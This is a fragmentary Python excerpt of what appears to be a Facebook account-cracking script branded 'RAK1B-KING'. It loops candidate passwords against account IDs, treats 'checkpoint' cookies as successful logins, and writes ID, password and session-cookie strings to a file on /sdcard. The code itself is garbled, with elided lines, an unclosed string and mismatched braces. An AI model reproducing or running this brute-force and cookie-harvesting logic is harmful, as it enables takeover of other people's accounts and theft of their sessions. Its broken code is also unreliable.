...
def m1(idf,pwv):
    ...
    for pw in pwv: 
        try:
            ...
            pw = pw.lower()
            get = session.get(f"https://www.facebook.com/profile.php?id=100082571205609&mibextid=ZbWKwL)
            date = {
 ...
 for pw in pwv:
  try:
   ...
   if "checkpoint" in po.cookies.get_dict().keys():
    ...
    ok+=1
    print(f'\r{P} [{H}RAK1B-KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
    if 'y' in cokix:
     print(f'\r{gen}{H}'+kuki)
    open(' /sdcard/RAK1B-KING-OK.txt','a').write(idf+'|'+pw+'\n')
    break
   else:
    continue
  except requests.exceptions.ConnectionError:
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [RAK1B-KING{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/RAK1B-KING-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{P} [{RAK1B-KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/RAK1B-KING-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
